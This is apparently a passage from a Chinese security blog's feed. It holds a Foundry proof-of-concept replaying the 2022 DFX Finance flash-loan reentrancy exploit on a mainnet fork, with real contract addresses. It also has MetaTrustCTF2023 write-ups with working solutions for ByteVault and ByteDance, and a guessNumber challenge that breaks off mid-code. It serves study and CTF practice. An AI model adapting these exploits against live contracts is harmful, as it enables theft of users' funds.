class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.10;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;./interface.sol&quot;;</span><br><span class="line"></span><br><span class="line">// @KeyInfo </span><br><span class="line"></span><br><span class="line">// key words: @flashloan @reentrancy</span><br><span class="line">// date: 2022.11.11</span><br><span class="line">// total Lost: 4 million$</span><br><span class="line">// network: Mainnet</span><br><span class="line">// Attacker: </span><br><span class="line">// Attack Contract: 0x6cfa86a352339e766ff1ca119c8c40824f41f22d</span><br><span class="line">// Vulnerable Contract: 0x46161158b1947d9149e066d6d31af1283b2d377c</span><br><span class="line">// Attack Tx: 0x6bfd9e286e37061ed279e4f139fbc03c8bd707a2cdd15f7260549052cbba79b7</span><br><span class="line"></span><br><span class="line">// @Info</span><br><span class="line">// Vulnerable Contract Code : 0x46161158b1947d9149e066d6d31af1283b2d377c</span><br><span class="line"></span><br><span class="line">// @Analysis</span><br><span class="line">// blog: https://www.levi104.com/2023/07/15/08.PoC/03.DFX%20Finance%20@Reentrancy@flashloan/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract DFXTest is DSTest&#123;</span><br><span class="line">    IERC20 XIDR = IERC20(0xebF2096E01455108bAdCbAF86cE30b6e5A72aa52);</span><br><span class="line">    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);</span><br><span class="line">    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);</span><br><span class="line">    Uni_Router_V3 Router = Uni_Router_V3(0xE592427A0AEce92De3Edee1F18E0157C05861564);</span><br><span class="line">    Curve dfx = Curve(0x46161158b1947D9149E066d6d31AF1283b2d377C);</span><br><span class="line">    uint256 receiption;</span><br><span class="line"></span><br><span class="line">    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);</span><br><span class="line"></span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        cheats.createSelectFork(&quot;mainnet&quot;, 15941703);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testExploit() public&#123;</span><br><span class="line">        address(WETH).call&#123;value: 2 ether&#125;(&quot;&quot;);</span><br><span class="line">        WETH.approve(address(Router), type(uint).max);</span><br><span class="line">        USDC.approve(address(Router), type(uint).max);</span><br><span class="line">        USDC.approve(address(dfx), type(uint).max);</span><br><span class="line">        XIDR.approve(address(Router), type(uint).max);</span><br><span class="line">        XIDR.approve(address(dfx), type(uint).max);</span><br><span class="line"></span><br><span class="line">        WETHToUSDC();</span><br><span class="line"></span><br><span class="line">        emit log_named_decimal_uint(</span><br><span class="line">            &quot;[Before] Attacker USDC balance before exploit&quot;,</span><br><span class="line">            USDC.balanceOf(address(this)),</span><br><span class="line">            6</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        USDCToXIDR();</span><br><span class="line">        uint[] memory XIDR_USDC = new uint[](2);</span><br><span class="line">        XIDR_USDC[0] = 0;</span><br><span class="line">        XIDR_USDC[1] = 0;</span><br><span class="line">        ( , XIDR_USDC) = dfx.viewDeposit(200_000 * 1e18);</span><br><span class="line">        dfx.flash(address(this), XIDR_USDC[0] * 995 / 1000, XIDR_USDC[1] * 995 / 1000, new bytes(1)); // 5% fee</span><br><span class="line">        dfx.withdraw(receiption, block.timestamp + 60);</span><br><span class="line">        XIDRToUSDC();</span><br><span class="line"></span><br><span class="line">        emit log_named_decimal_uint(</span><br><span class="line">            &quot;[End] Attacker USDC balance after exploit&quot;,</span><br><span class="line">            USDC.balanceOf(address(this)),</span><br><span class="line">            6</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external&#123;</span><br><span class="line">        (receiption, ) = dfx.deposit(200_000 * 1e18, block.timestamp + 60);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function WETHToUSDC() internal&#123;</span><br><span class="line">        Uni_Router_V3.ExactInputSingleParams memory _Params = Uni_Router_V3.ExactInputSingleParams(&#123;</span><br><span class="line">            tokenIn: address(WETH),</span><br><span class="line">            tokenOut: address(USDC),</span><br><span class="line">            fee: 500,</span><br><span class="line">            recipient: address(this),</span><br><span class="line">            deadline: block.timestamp,</span><br><span class="line">            amountIn: WETH.balanceOf(address(this)),</span><br><span class="line">            amountOutMinimum: 0,</span><br><span class="line">            sqrtPriceLimitX96: 0</span><br><span class="line">        &#125;);</span><br><span class="line">        Router.exactInputSingle(_Params);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function USDCToXIDR() internal&#123;</span><br><span class="line">        Uni_Router_V3.ExactInputSingleParams memory _Params = Uni_Router_V3.ExactInputSingleParams(&#123;</span><br><span class="line">            tokenIn: address(USDC),</span><br><span class="line">            tokenOut: address(XIDR),</span><br><span class="line">            fee: 500,</span><br><span class="line">            recipient: address(this),</span><br><span class="line">            deadline: block.timestamp,</span><br><span class="line">            amountIn: USDC.balanceOf(address(this)) / 2,</span><br><span class="line">            amountOutMinimum: 0,</span><br><span class="line">            sqrtPriceLimitX96: 0</span><br><span class="line">        &#125;);</span><br><span class="line">        Router.exactInputSingle(_Params);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function XIDRToUSDC() internal&#123;</span><br><span class="line">        Uni_Router_V3.ExactInputSingleParams memory _Params = Uni_Router_V3.ExactInputSingleParams(&#123;</span><br><span class="line">            tokenIn: address(XIDR),</span><br><span class="line">            tokenOut: address(USDC),</span><br><span class="line">            fee: 500,</span><br><span class="line">            recipient: address(this),</span><br><span class="line">            deadline: block.timestamp,</span><br><span class="line">            amountIn: XIDR.balanceOf(address(this)) / 2,</span><br><span class="line">            amountOutMinimum: 0,</span><br><span class="line">            sqrtPriceLimitX96: 0</span><br><span class="line">        &#125;);</span><br><span class="line">        Router.exactInputSingle(_Params);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Remediation"><a href="#Remediation" class="headerlink" title="Remediation"></a>Remediation</h2><p>fixed flashloan() checking logic</p>]]></content>
      
      
      <categories>
          
          <category> 08.PoC </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>03.ByteVault</title>
      <link href="/2023/09/15/22.MetaTrustCTF2023/03.ByteVault/"/>
      <url>/2023/09/15/22.MetaTrustCTF2023/03.ByteVault/</url>
      
        <content type="html"><![CDATA[<h1 id="ByteVault"><a href="#ByteVault" class="headerlink" title="ByteVault"></a>ByteVault</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="1-全局观"><a href="#1-全局观" class="headerlink" title="1.全局观"></a>1.全局观</h3><p>代码量很少，只有一个<code>withdraw()</code>供调用</p><h3 id="2-任务"><a href="#2-任务" class="headerlink" title="2.任务"></a>2.任务</h3><p>将此合约的余额归零</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function isSolved() public view returns(bool)&#123;</span><br><span class="line">    return address(this).balance == 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-详细分析"><a href="#3-详细分析" class="headerlink" title="3.详细分析"></a>3.详细分析</h3><p>modifier要求我们用合约进行攻击：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">modifier onlyBytecode() &#123;</span><br><span class="line">    require(msg.sender != tx.origin, &quot;No high-level contracts allowed!&quot;);</span><br><span class="line">    _;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于<code>withdraw()</code>的分析如下：我们需要用一个合约进行攻击，这个合约的字节码的字节长度需要是奇数，并且包含了0xdeadbeef</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">  function withdraw() external onlyBytecode &#123;</span><br><span class="line">      uint256 sequence = 0xdeadbeef;</span><br><span class="line">      bytes memory senderCode;</span><br><span class="line"></span><br><span class="line">      address bytecaller = msg.sender;</span><br><span class="line"></span><br><span class="line">// 那么大概意思就是要让我们用字节码创造一个合约</span><br><span class="line">      assembly &#123;</span><br><span class="line">          let size := extcodesize(bytecaller) // 调用者的代码大小</span><br><span class="line">          senderCode := mload(0x40) // 空闲指针</span><br><span class="line">          // 修改空闲指针内容</span><br><span class="line">          // 修改空闲指针内容，空闲指针指向新的可用内存（将要存储的 size和我们的合约代码 之后的位置）</span><br><span class="line">          mstore(0x40, add(senderCode, and(add(add(size, 0x20), 0x1f), not(0x1f))))</span><br><span class="line">          // 在内存中写入size和实际的合约代码内容</span><br><span class="line">          //  操作之后的memory: |         size         |      实际的代码内容      |  空闲指针指向位置   |</span><br><span class="line">          mstore(senderCode, size)</span><br><span class="line">          extcodecopy(bytecaller, add(senderCode, 0x20), 0, size)</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      // 攻击合约的字节长度必须是奇数</span><br><span class="line">      require(senderCode.length % 2 == 1, &quot;Bytecode length must be even!&quot;);</span><br><span class="line"></span><br><span class="line">      // 因此我们的字节码需要包含0xdeadbeef</span><br><span class="line">      for(uint256 i = 0; i &lt; senderCode.length - 3; i++) &#123;</span><br><span class="line">          // 第i个字节是0x000000de[de]</span><br><span class="line">          if(senderCode[i] == byte(uint8(sequence &gt;&gt; 24)) </span><br><span class="line">              // 第i+1个字节是0x0000dead[ad]</span><br><span class="line">              &amp;&amp; senderCode[i+1] == byte(uint8((sequence &gt;&gt; 16) &amp; 0xFF))</span><br><span class="line">              // 第i+2个字节是0x00deadbe[be]</span><br><span class="line">              &amp;&amp; senderCode[i+2] == byte(uint8((sequence &gt;&gt; 8) &amp; 0xFF))</span><br><span class="line">              // 第i+3个字节是0xdeadbeef[ef]</span><br><span class="line">              &amp;&amp; senderCode[i+3] == byte(uint8(sequence &amp; 0xFF))) &#123;</span><br><span class="line">              msg.sender.transfer(address(this).balance);</span><br><span class="line">              return;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      revert(&quot;Sequence not found!&quot;);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>我的解题思路：字节码长度是奇数比较简单，不断尝试在合约中添加没用的代码，试出来奇数字节长度的合约；需要包含0xdeadbeef则直接将0xdeadbeef写成constant，硬编码进bytecode即可。</p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">contract attacker&#123;</span><br><span class="line">    bytes constant aaa = &quot;0xdeadbeef&quot;;</span><br><span class="line">    bytes constant bbb = hex&quot;deadbeef&quot;;</span><br><span class="line"></span><br><span class="line">    function attack(BytecodeVault addr) public &#123;</span><br><span class="line">        bytes memory xx = aaa;</span><br><span class="line">        bytes memory s = bbb;</span><br><span class="line"></span><br><span class="line">        addr.withdraw();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function() external payable&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 22.MetaTrustCTF2023 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>02.Bytedance</title>
      <link href="/2023/09/15/22.MetaTrustCTF2023/02.Bytedance/"/>
      <url>/2023/09/15/22.MetaTrustCTF2023/02.Bytedance/</url>
      
        <content type="html"><![CDATA[<h1 id="Bytedance"><a href="#Bytedance" class="headerlink" title="Bytedance"></a>Bytedance</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="1-全局观"><a href="#1-全局观" class="headerlink" title="1.全局观"></a>1.全局观</h3><p>本题代码量很少，只有一个合约：<code>isOddByte()</code>和<code>isByteDance()</code>是pure方法，只能调用<code>checkCode()</code></p><h3 id="2-任务"><a href="#2-任务" class="headerlink" title="2.任务"></a>2.任务</h3><p>将状态变量solved设置为true，但是<code>checkCode()</code>中包含delegatecall，因此我们要成功调用<code>checkCode()</code>然后修改slot_0的内容为1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(bool success,) = _yourContract.delegatecall(&quot;&quot;);</span><br><span class="line"></span><br><span class="line">function isSolved() public view returns(bool)&#123;</span><br><span class="line">    return solved;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-详细分析"><a href="#3-详细分析" class="headerlink" title="3.详细分析"></a>3.详细分析</h3><h4 id="3-1特殊要求"><a href="#3-1特殊要求" class="headerlink" title="3.1特殊要求"></a>3.1特殊要求</h4><p>我们先来看两个会被调用到的pure方法：</p><p><code>isOddByte()</code>：输入一个字节的数据，要求该数据是奇数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function isOddByte(bytes1 b) internal pure returns (bool) &#123;</span><br><span class="line">    return (uint8(b) % 2) == 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>isByteDance()</code>：如下代码分析，可以看出，我们不能够让程序进入到<code>isPal := 0</code>，要让他返回true</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">function isByteDance(bytes1 b) internal pure returns (bool) &#123;</span><br><span class="line">    bool isPal = true;</span><br><span class="line">    assembly &#123;</span><br><span class="line">        let bVal := byte(0, b) // bVal就是b</span><br><span class="line">        for &#123; let i := 0 &#125; lt(i, 4) &#123; i := add(i, 1) &#125; // 4次循环</span><br><span class="line">        &#123;</span><br><span class="line">            // 7-i = x</span><br><span class="line">            // bVal 逻辑右移 x 位 = y</span><br><span class="line">            // y取最低一位</span><br><span class="line">            let bitLeft := and(shr(sub(7, i), bVal), 0x01)</span><br><span class="line">            // vVal逻辑右移i位 = x</span><br><span class="line">            // x取最低一位</span><br><span class="line">            let bitRight := and(shr(i, bVal), 0x01)</span><br><span class="line">            // 不能进去，也就是bitLeft和bitRight要相等</span><br><span class="line">            if iszero(eq(bitLeft, bitRight)) &#123; </span><br><span class="line">                isPal := 0</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return isPal;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据此方法的要求，我们可以得到满足条件的bytes1数据：0x81</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">              [0x81]   |     [0x81]       </span><br><span class="line">init       1000 0001   |   1000 0001   </span><br><span class="line">shr(7)     0000 0001   |   1000 0001   shr(0)</span><br><span class="line">shr(6)     0000 0010   |   0100 0000   shr(1)</span><br><span class="line">shr(5)     0000 0100   |   0010 0000   shr(2)</span><br><span class="line">shr(4)     0000 1000   |   0001 0000   shr(3)</span><br></pre></td></tr></table></figure><p>再来看主函数<code>checkCode()</code>：通过下面的分析，我们可以知道我们需要做的就是自己手动创建一个合约，这个合约的字节码需要满足相关的条件：每一个字节都要是奇数，存在一个字节内容满足<code>isByteDance()</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">  function checkCode(address _yourContract) public &#123;</span><br><span class="line">      require(!solved, &quot;Challenge already solved&quot;); </span><br><span class="line">      bytes memory code;</span><br><span class="line">      uint256 size;</span><br><span class="line">      bool hasDanceByte = false;</span><br><span class="line">      </span><br><span class="line">      // 那么大概意思就是要让我们用字节码创造一个合约</span><br><span class="line">      assembly &#123; </span><br><span class="line">          size := extcodesize(_yourContract) // 调用者的代码大小</span><br><span class="line">          code := mload(0x40) // 空闲指针</span><br><span class="line">          // 修改空闲指针内容，空闲指针指向新的可用内存（将要存储的 size和我们的合约代码 之后的位置）</span><br><span class="line">          mstore(0x40, add(code, and(add(add(size, 0x20), 0x1f), not(0x1f))))</span><br><span class="line">          // 在内存中写入size和实际的合约代码内容</span><br><span class="line">          //  操作之后的memory: |         size         |      实际的代码内容      |  空闲指针指向位置   |</span><br><span class="line">          mstore(code, size)</span><br><span class="line">          extcodecopy(_yourContract, add(code, 0x20), 0, size)</span><br><span class="line">      &#125;</span><br><span class="line">      // 扫描我们合约字节码的每一个字节的内容</span><br><span class="line">      for (uint256 i = 0; i &lt; size; i++) &#123;</span><br><span class="line">          bytes1 b = code[i];</span><br><span class="line">          // 如果这个字节满足isByteDance()，则返回true</span><br><span class="line">          if (isByteDance(b)) &#123; </span><br><span class="line">              hasDanceByte = true;</span><br><span class="line">          &#125;</span><br><span class="line">          // 合约字节码的每一个字节都要是奇数</span><br><span class="line">          require(isOddByte(b), &quot;Byte is not odd&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">      require(hasDanceByte, &quot;No palindrome byte found&quot;);</span><br><span class="line">// 然后就delegatecall我们的攻击合约，修改slot_0内容为true</span><br><span class="line">      (bool success,) = _yourContract.delegatecall(&quot;&quot;);</span><br><span class="line">      require(success, &quot;Delegatecall failed&quot;);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>那么我们现在就来构造这个合约。如果通过正常写合约代码，是无法满足这两个条件的，因为我们无法保证编译器编译出来的字节内容，只能保证功能。因此，我们需要自己手动写字节码，然后部署上去。任务：这个字节码需要实现修改slot_0的内容为true的功能、满足<code>isByteDance()</code>（这个我们前面分析了，用0x81）、每一个字节都是奇数（这就限制了我们使用的操作码的内容）。</p><h4 id="3-2构造字节码"><a href="#3-2构造字节码" class="headerlink" title="3.2构造字节码"></a>3.2构造字节码</h4><p>核心功能是：用SSTORE将slot_0的内容设置为true，也就是需要stack中包含0,1两个数值，然后用SSTORE写入。</p><p>我一开始想的是用PUSH将0和1放进stack，然后SSTORE，最后再停止程序，在程序后面补上0x81。但是PUSH有限制，只能取61,63,65等，并且取了不同的PUSH，输入的内容为1的话，前面会有多余0不符合奇数，输入的数值为0的话，也不符合奇数，因此需要另辟蹊径。</p><p>我的想法是用DUP复制，但是也不太可行。便想到用移位和ISZERO来操作行得通：通过下面的步骤就完成了核心功能</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[00]PUSH20101   61 0101 </span><br><span class="line">[03]PUSH21101   61 1101 </span><br><span class="line">[06]SHL           1B</span><br><span class="line">[07]ISZERO       15</span><br><span class="line">[08]PUSH20101   61 0101</span><br><span class="line">[0b]PUSH21101   61 1101</span><br><span class="line">[0e]SHL           1B</span><br><span class="line">[0f]SSTORE       55 </span><br></pre></td></tr></table></figure><p>然后就是要想办法将0x81嵌入进字节码：我的想法是直接用RETURN返回程序，这样就不会报错，并且将0x81嵌入到返回值选取的内容当中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[18]PUSH20101   61 0101</span><br><span class="line">[1b]PUSH21181   61 1181</span><br><span class="line">[20]RETURN       F3</span><br></pre></td></tr></table></figure><p>将操作码连接起来，就成为了我们的字节码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6101016111011B156101016111011B55610101611181F3</span><br></pre></td></tr></table></figure><p>最后就是我们需要一个方法来部署这个字节码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">contract Deployer&#123;</span><br><span class="line">    function deploy() public returns(address)&#123;</span><br><span class="line">        bytes memory x = hex&quot;6101016111011B156101016111011B55610101611181F3&quot;;</span><br><span class="line">        return address(new OurBytecode(x));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract OurBytecode&#123;</span><br><span class="line">    constructor(bytes memory code)&#123;assembly&#123;return (add(code, 0x20), mload(code))&#125;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Script.sol&quot;;</span><br><span class="line">import &quot;./ByteDance.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract attacker is Script &#123;</span><br><span class="line">    function run() public &#123;</span><br><span class="line">        uint256 deployerPrivateKey = vm.envUint(&quot;privatekey&quot;);</span><br><span class="line">        vm.startBroadcast(deployerPrivateKey);</span><br><span class="line"></span><br><span class="line">        Deployer deployer = new Deployer();</span><br><span class="line">        address addr = deployer.deploy();</span><br><span class="line">        ByteDance level = ByteDance(0xA3c3cb2FC91412ff3B18C2a795AeC4b816f9bCD2);</span><br><span class="line">        level.checkCode(address(addr));</span><br><span class="line"></span><br><span class="line">        vm.stopBroadcast();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract Deployer&#123;</span><br><span class="line">    function deploy() public returns(address)&#123;</span><br><span class="line">        bytes memory x = hex&quot;6101016111011B156101016111011B55610101611181F3&quot;;</span><br><span class="line">        return address(new OurBytecode(x));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract OurBytecode&#123;</span><br><span class="line">    constructor(bytes memory code)&#123;</span><br><span class="line">        assembly&#123;</span><br><span class="line">            return (add(code, 0x20), mload(code))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 22.MetaTrustCTF2023 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>01.guessNumber</title>
      <link href="/2023/09/15/22.MetaTrustCTF2023/01.guessNumber/"/>
      <url>/2023/09/15/22.MetaTrustCTF2023/01.guessNumber/</url>
      
        <content type="html"><![CDATA[<h1 id="guessNumber"><a href="#guessNumber" class="headerlink" title="guessNumber"></a>guessNumber</h1><p>有幸参与本次出题，本题题解如下</p><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><ul><li>考点难度：中等偏高</li><li>考点方向：内联汇编，CREATE2，假地址，预编译合约</li><li>知识点<ul><li>CREATE2：常规</li><li>内联汇编：零值槽位：内存0x60~0x80；immutable变量的初始化赋值方式，本题是，内存0x80~0xa0、内存0xa0~0xc0和内存0xc0~0xe0</li><li>假地址：土狗合约常用来欺骗用户，看似mytoken变量是合约A，但不是new出来的，传入的是合约B</li><li>预编译合约：0x0000000000000000000000000000000000000002每个节点都预编译了它，任何值传进去都是做sha2-256返回bytes32</li></ul></li><li><p>题目场景描述：这是一个有趣的猜数游戏，如果你成功猜测到4个正确的值，那么你可以得到我们100 token的奖励</p></li><li><p>题目部署方式</p><ol><li>部署合约B（注意B合约不要给出来）</li><li>合约B地址作为参数，部署合约GuessGame</li><li>调用<code>captureTheFalg()</code>返回true即为成功</li></ol></li></ul><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 